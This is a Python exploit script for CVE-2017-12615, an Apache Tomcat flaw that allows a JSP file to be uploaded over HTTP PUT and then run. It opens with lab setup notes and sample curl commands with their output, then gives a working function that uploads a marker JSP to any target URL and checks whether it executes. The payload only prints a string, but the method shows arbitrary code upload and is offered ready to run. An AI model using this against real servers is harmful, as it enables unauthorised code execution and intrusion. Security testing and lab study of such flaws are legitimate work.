#!/usr/bin/python
# -*- coding: utf-8 -

# name  : Apache Tomcat Remote Code Execution via JSP upload
# cve   : CVE-2017-12615
# author: Nixawk

'''
## [Lab] CVE-2017-12615

1. create a docker containter baseed on tomcat 7.0.81
2. disable [readonly] settings in [conf/web.xml]. 

    Add the following contents into [conf/web.xml] (It may be the first part.)

            <init-param>
                <param-name>readonly</param-name>
                <param-value>false</param-value>
            </init-param>

3. Pwn the lab with curl.

    $ curl -v -X PUT http://127.0.0.1:32770/test.jsp/ --data "<% out.println(1 + 2); %>"
    *   Trying 127.0.0.1...
    * TCP_NODELAY set
    * Connected to 127.0.0.1 (127.0.0.1) port 32770 (#0)
    > PUT /test.jsp/ HTTP/1.1
    > Host: 127.0.0.1:32770
    > User-Agent: curl/7.54.0
    > Accept: */*
    > Content-Length: 25
    > Content-Type: application/x-www-form-urlencoded
    >
    * upload completely sent off: 25 out of 25 bytes
    < HTTP/1.1 201 Created
    < Server: Apache-Coyote/1.1
    < Content-Length: 0
    < Date: Thu, 21 Sep 2017 06:42:13 GMT
    <
    * Connection #0 to host 127.0.0.1 left intact


    $ curl http://127.0.0.1:32770/test.jsp
    3

4. develop a py module.
'''

'''
$ python exploit_CVE-2017-12615.py http://127.0.0.1:32770/
INFO:__main__:{
    'data': "'HTTP/1.1 200 OK\\r\\nServer:Apache-Coyote/1.1\\r\\n.....\\r\\n\\r\\n^.^-CVE201712615\\n'",
    'status': True,
    'url': 'http://127.0.0.1:32770//cve201712615.jsp',
    'service': 'http'
}
'''

import logging
import requests


logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

HTTP_USERAGENT = "Mozilla/5.0"
HTTP_TIMEOUT = 8.0


# /* exploit TOMCAT CVE-2017-12615 through HTTP PUT METHOD */
def exploit(indexuri):

    is_vulnerable, data = False, ''

    try:
        payload = '<% out.println("^.^-CVE" + 2017 + 12615); %>'

        put_upload_url = indexuri + "/cve201712615.jsp/"  # stable 
        put_access_url = indexuri + "/cve201712615.jsp"

        # /* PUT UPLOAD FILE */
        requests.put(
            put_upload_url, data=payload,
            timeout=HTTP_TIMEOUT,
            headers={'User-Agent': HTTP_USERAGENT}
        )
        response = requests.get(
            put_access_url,
            timeout=HTTP_TIMEOUT,
            headers={'User-Agent': HTTP_USERAGENT}
        )

        # /* CHECK VUL STATUS */
        if '^.^-CVE201712615' in response.text:
            is_vulnerable = True

        data = u'HTTP/1.1 {status_code} {status}\r\n{headers}\r\n\r\n{body}'.format(
                status_code=response.status_code,
                status=response.reason,
                headers='\r\n'.join([key+":"+value for key, value in response.headers.items()]),
                body=response.text
            )

    except Exception as err:
        log.exception("{} - {}".format(indexuri, err))

    info = {
        'data'      : repr(data),
        'status'    : is_vulnerable,
        'url'       : put_access_url,
        'service'   : u'http'
    }

    log.info(info)

    return info


if __name__ == '__main__':
    import sys

    if len(sys.argv) != 2:
        log.info("python %s <tomcat-url>", sys.argv[0])
        sys.exit(0)

    tomcat_url = sys.argv[1]
    exploit(tomcat_url)


## References
# http://seclists.org/oss-sec/2017/q3/484
# https://nvd.nist.gov/vuln/detail/CVE-2017-12615
# https://www.tutorialspoint.com/jsp/jsp_syntax.htm